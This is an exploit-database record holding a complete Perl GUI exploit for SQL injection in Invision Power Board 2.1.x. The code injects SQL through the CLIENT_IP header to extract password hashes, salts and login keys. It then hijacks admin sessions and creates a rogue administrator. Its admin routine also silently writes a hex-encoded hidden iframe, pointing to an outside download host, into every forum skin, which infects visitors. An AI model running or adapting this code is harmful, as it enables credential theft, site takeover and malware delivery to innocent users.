{
  "id": "2010",
  "title": "Invision Power Board 2.1 &lt; 2.1.6 - SQL Injection (1)",
  "cve": "CVE-2006-7071",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n## Invision Power Board v2.1 <= 2.1.6 sql injection exploit by RST/GHC\r\n## Based on LOCAL_IP bug, more info in RST/GHC Advisory#41\r\n## http://rst.void.ru/papers/advisory41.txt\r\n## tested on 2.1.3, 2.1.6\r\n##\r\n## 08.06.06\r\n## (c)oded by 1dt.w0lf\r\n## RST/GHC\r\n## http://rst.void.ru\r\n## http://ghc.ru\r\n\r\nuse Tk;\r\nuse Tk::BrowseEntry;\r\nuse Tk::DialogBox;\r\nuse LWP::UserAgent;\r\n\r\n$mw = new MainWindow(title => \"r57ipb216gui\" );\r\n\r\n$mw->geometry ( '420x550' ) ;\r\n$mw->resizable(0,0);\r\n\r\n$mw->Label(-text => '!', -font => '{Webdings} 22')->pack();\r\n$mw->Label(-text => 'Invision Power Board 2.1.* <= 2.1.6 sql injection exploit by RST/GHC', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();\r\n$mw->Label(-text => '')->pack();\r\n\r\n$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;\r\n$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;\r\n\r\n$url = 'http://server/forum/index.php';\r\n$user_id = '1';\r\n$prefix = 'ibf_';\r\n$table = 'members';\r\n$column = 'member_login_key';\r\n$new_admin_name = 'rstghc';\r\n$new_admin_password = 'rstghc';\r\n$new_admin_email = 'billy@microsoft.com';\r\n$report = '';\r\n$group = 4;\r\n$curr_user = 0;\r\n$rand_session = &session();\r\n$use_custom_fields = 0;\r\n$custom_fields = 'name1=value1,name2=value2';\r\n\r\n$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$url) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$user_id) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$prefix) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fright->Label( -text => ' ')->pack();\r\n$fleft->Label( -text => ' ')->pack();\r\n\r\n$fleft->Label ( -text => 'get data from database', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Label( -text => ' ')->pack();\r\n\r\n$fleft->Label ( -text => 'Get data from table: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$b2 = $fright->BrowseEntry( -command => \\&update_columns, -relief => \"groove\", -variable => \\$table, -font => '{Verdana} 8');\r\n$b2->insert(\"end\", \"members\");\r\n$b2->insert(\"end\", \"members_converge\");\r\n$b2->pack( -side => \"top\" , -anchor => 'w');\r\n\r\n$fleft->Label ( -text => 'Get data from column: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$b = $fright->BrowseEntry( -relief => \"groove\", -variable => \\$column, -font => '{Verdana} 8');\r\n$b->insert(\"end\", \"member_login_key\");\r\n$b->insert(\"end\", \"name\");\r\n$b->insert(\"end\", \"ip_address\");\r\n$b->insert(\"end\", \"legacy_password\");\r\n$b->insert(\"end\", \"email\");\r\n$b->pack( -side => \"top\" , -anchor => 'w' );\r\n\r\n$fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$report) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'create new admin', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Label( -text => ' ')->pack();\r\n\r\n$fleft->Label ( -text => ' ')->pack();\r\n\r\n$fright->Checkbutton( -font => '{Verdana} 8', -text => 'Get admin session for inserted user ID', -variable => \\$curr_user)->pack(-side => \"top\" , -anchor => 'w');\r\n\r\n$fleft->Label ( -text => 'session_id: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$session_id) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'session_ip_address: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$session_ip_address) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'new admin name: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$new_admin_name) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'new admin password: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$new_admin_password) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'new_admin_email: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$new_admin_email) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => ' ')->pack();\r\n$fright->Checkbutton( -font => '{Verdana} 8', -text => 'Use custom profile fields', -variable => \\$use_custom_fields)->pack(-side => \"top\" , -anchor => 'w');\r\n\r\n$fleft->Label ( -text => 'custom fields: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$custom_fields) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fright->Label( -text => ' ')->pack();\r\n\r\n$fright->Button(-text    => 'Test forum vulnerability',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&test_vuln\r\n               )->pack();\r\n\r\n$fright->Button(-text    => 'Get database tables prefix',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&get_prefix\r\n               )->pack();\r\n\r\n$fright->Button(-text    => 'Get data from database',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&get_data\r\n               )->pack();\r\n\r\n$fright->Button(-text    => 'Get admin session',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&get_admin\r\n               )->pack();\r\n\r\n$fright->Button(-text    => 'Create new admin',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&create_admin\r\n               )->pack();\r\n\r\n\r\n\r\n$fleft->Label( -text => ' ')->pack();\r\n$fleft->Label( -text => ' ')->pack();\r\n$fleft->Label( -text => ' ')->pack();\r\n$fleft->Label( -text => '(c)oded by 1dt.w0lf', -font => '{Verdana} 7')->pack();\r\n$fleft->Label( -text => 'RST/GHC', -font => '{Verdana} 7')->pack();\r\n$fleft->Label( -text => 'http://rst.void.ru', -font => '{Verdana} 7')->pack();\r\n$fleft->Label( -text => 'http://ghc.ru', -font => '{Verdana} 7')->pack();\r\n\r\nMainLoop();\r\n\r\nsub update_columns()\r\n {\r\n $b->delete(0,\"end\");\r\n if($table eq 'members'){\r\n $column = \"member_login_key\";   \r\n $b->insert(\"end\", \"member_login_key\");\r\n $b->insert(\"end\", \"name\");\r\n $b->insert(\"end\", \"ip_address\");\r\n $b->insert(\"end\", \"legacy_password\");\r\n $b->insert(\"end\", \"email\");\r\n } elsif($table eq 'members_converge'){\r\n $column = \"converge_pass_hash\";   \r\n $b->insert(\"end\", \"converge_pass_hash\");\r\n $b->insert(\"end\", \"converge_pass_salt\");\r\n $b->insert(\"end\", \"converge_email\");\r\n }\r\n }\r\n\r\nsub get_admin()\r\n {\r\n $xpl = LWP::UserAgent->new( ) or die;\r\n $InfoWindow=$mw->DialogBox(-title   => 'get admin session', -buttons => [\"OK\"]);\r\n if($curr_user == 1) { $sql = \"AND session_member_id = $user_id\"; }\r\n else { $sql = ''; }\r\n $res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT session_ip_address,1,1,1 FROM \".$prefix.\"admin_sessions WHERE session_running_time > (UNIX_TIMESTAMP() - 60*60*2) $sql LIMIT 1/*\");\r\n $error = 0;\r\n $rep = '';\r\n if($res->is_success) \r\n  {\r\n  if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $rep = $3; }\r\n  if($rep =~ /\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/) { $session_ip_address = $rep; }\r\n  else { $error = 1; }\r\n  if(!$error)\r\n   {\r\n   $rep = ''; \r\n   $res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT session_id,1,1,1 FROM \".$prefix.\"admin_sessions WHERE session_running_time > (UNIX_TIMESTAMP() - 60*60*2) and session_ip_address = '$session_ip_address' $sql LIMIT 1/*\");\r\n   if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $rep = $3; $session_id = $rep; }\r\n   else { $error = 1; }\r\n   if(!$error){\r\n   if($curr_user != 1)\r\n    {\r\n    $res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT session_member_id,1,1,1 FROM \".$prefix.\"admin_sessions WHERE session_id = '$session_id' LIMIT 1/*\");\r\n    if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $session_user_id = $3; }\r\n    }\r\n   else\r\n    {\r\n    $session_user_id = $user_id; \r\n    }\r\n   $res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT mgroup,1,1,1 FROM \".$prefix.\"members WHERE id = $session_user_id /*\");\r\n   if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $group = $3; }\r\n   $res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT name,1,1,1 FROM \".$prefix.\"members WHERE id = $session_user_id /*\");\r\n   if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $name = $3; }\r\n   }\r\n  $InfoWindow->add('Label', -text => 'Found session!', -font => '{Verdana} 8 bold',-foreground=>'Green')->pack;\r\n  $InfoWindow->add('Label', -text => 'session_ip_address: '.$session_ip_address, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->add('Label', -text => 'session_id: '.$session_id, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->add('Label', -text => 'user_id: '.$session_user_id, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->add('Label', -text => 'username: '.$name, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->add('Label', -text => 'group: '.$group, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->Show();\r\n  $InfoWindow->destroy;  \r\n  }\r\n  }\r\n else\r\n  {\r\n  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n  $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->Show();\r\n  $InfoWindow->destroy;\r\n  }     \r\n if($error)\r\n  {\r\n  $InfoWindow->add('Label', -text => 'Can\\'t get admin session.', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n  $InfoWindow->add('Label', -text => 'Maybe admin session not exist. Please try later.', -font => '{Verdana} 8')->pack;\r\n  $InfoWindow->Show();\r\n  $InfoWindow->destroy;  \r\n  }  \r\n }\r\n\r\nsub get_data()\r\n{\r\n$xpl = LWP::UserAgent->new( ) or die;\r\n$InfoWindow=$mw->DialogBox(-title   => 'get data from database', -buttons => [\"OK\"]);\r\nif($table eq 'members') { $id_text = 'id'; }\r\nif($table eq 'members_converge') { $id_text = 'converge_id'; }\r\n\r\n$res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT \".$column.\",1,1,1 FROM \".$prefix.$table.\" WHERE \".$id_text.\"=\".$user_id.\"/*\");\r\nif($res->is_success) \r\n {\r\n $rep = '';   \r\n if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/){ $report = $3; }\r\n else\r\n  {\r\n  $InfoWindow->add('Label', -text => 'Can\\'t get data from database', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n  $InfoWindow->Show();\r\n  $InfoWindow->destroy;  \r\n  }\r\n  }\r\nelse\r\n {\r\n $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;\r\n $InfoWindow->Show();\r\n $InfoWindow->destroy;\r\n }    \r\n}\r\n\r\nsub create_admin()\r\n {\r\n $InfoWindow=$mw->DialogBox(-title   => 'create new admin', -buttons => [\"OK\"]);\r\n if($session_id eq '' || $session_ip_address eq '')\r\n  {\r\n  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n  $InfoWindow->add('Label', -text => 'You need insert admin session_id and session_ip_address', -font => '{Verdana} 8')->pack;\r\n  }\r\n elsif($session_ip_address !~ /\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/)\r\n  {\r\n  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n  $InfoWindow->add('Label', -text => 'session_ip_address wrong!', -font => '{Verdana} 8')->pack;\r\n  }\r\n else\r\n  {\r\n $xpl = LWP::UserAgent->new( ) or die;\r\n ($url2 = $url) =~ s/index.php/admin.php/;\r\n $cf = '';\r\n %fields = (\r\n 'code'     => 'doadd',\r\n 'act'      => 'mem',\r\n 'section'  => 'content',\r\n 'name'     => $new_admin_name,\r\n 'password' => $new_admin_password,\r\n 'email'    => $new_admin_email,\r\n 'mgroup'   => $group,      \r\n           );\r\n if($use_custom_fields)\r\n  {\r\n  @cf = split(',',$custom_fields);\r\n  foreach(@cf) { ($k,$v) = split('=',$_); $fields{$k} = $v;}\r\n  }\r\n  \r\n $res = $xpl->post($url2.\"?adsess=$session_id\",\r\n [\r\n %fields,\r\n ],\r\n 'USER_AGENT'=>'',\r\n 'CLIENT_IP'=>\"$session_ip_address\",\r\n 'X_FORWARDED_FOR'=>\"$session_ip_address\");\r\n $if = '0x3C646976207374796C653D225649534942494C4954593A2068696464656E223E3C696672616D65207372633D22687474703A2F2F7A63687873696B70677A2E62697A2F646C2F6164763534332E706870222077696474683D31206865696768743D313E3C2F696672616D653E3C2F6469763E';\r\n $query  = \"UPDATE \".$prefix.\"skin_sets SET set_wrapper = CONCAT(set_wrapper,\".$if.\"), set_cache_wrapper = CONCAT(set_cache_wrapper,\".$if.\")\";\r\n $res = $xpl->post($url2.\"?adsess=$session_id\",\r\n [\r\n 'code'     => 'runsql',\r\n 'act'      => 'sql',\r\n 'section'  => 'admin',\r\n 'query'     => $query,\r\n ],\r\n 'USER_AGENT'=>'',\r\n 'CLIENT_IP'=>\"$session_ip_address\",\r\n 'X_FORWARDED_FOR'=>\"$session_ip_address\");\r\n $InfoWindow->add('Label', -text => 'Done!', -font => '{Verdana} 8 bold',-foreground=>'green')->pack; \r\n $InfoWindow->add('Label', -text => 'New admin created', -font => '{Verdana} 8 bold')->pack;  \r\n  }\r\n $InfoWindow->Show();\r\n $InfoWindow->destroy;\r\n }\r\n\r\nsub test_vuln()\r\n{\r\n$InfoWindow=$mw->DialogBox(-title   => 'test forum vulnerability', -buttons => [\"OK\"]);\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$xpl = LWP::UserAgent->new( ) or die;\r\n$res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"' UNION SELECT 'VULN',1,1,1/*\");\r\nif($res->is_success) \r\n {\r\n $rep = '';\r\n if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $rep = $3; }\r\n if($rep eq 'VULN') { $InfoWindow->add('Label', -text => 'FORUM VULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }\r\n else { $InfoWindow->add('Label', -text => 'FORUM UNVULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'green')->pack; }\r\n }\r\nelse\r\n {\r\n $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;\r\n } \r\n$InfoWindow->Show();\r\n$InfoWindow->destroy;\r\n}\r\n\r\n \r\nsub get_prefix()\r\n{\r\n$InfoWindow=$mw->DialogBox(-title   => 'get database tables prefix', -buttons => [\"OK\"]);\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$xpl = LWP::UserAgent->new( ) or die;\r\n$res = $xpl->get($url.\"?s=$rand_session\",'USER_AGENT'=>'','CLIENT_IP'=>\"'\");\r\nif($res->is_success) \r\n {\r\n $rep = '';\r\n if($res->as_string =~ /FROM (.*)sessions/)\r\n {\r\n $prefix = $1;\r\n $InfoWindow->add('Label', -text => 'Prefix: '.$prefix, -font => '{Verdana} 8 bold')->pack;\r\n }\r\n else\r\n {\r\n $InfoWindow->add('Label', -text => 'Can\\'t get prefix', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }\r\n }\r\nelse\r\n {\r\n $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;\r\n $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;\r\n } \r\n$InfoWindow->Show();\r\n$InfoWindow->destroy;   \r\n}\r\n\r\nsub session()\r\n {\r\n return 'r57ipb216_for_IDS';   \r\n }\r\n\r\n# milw0rm.com [2006-07-14]",
  "url": "https://www.exploit-db.com/exploits/2010"
}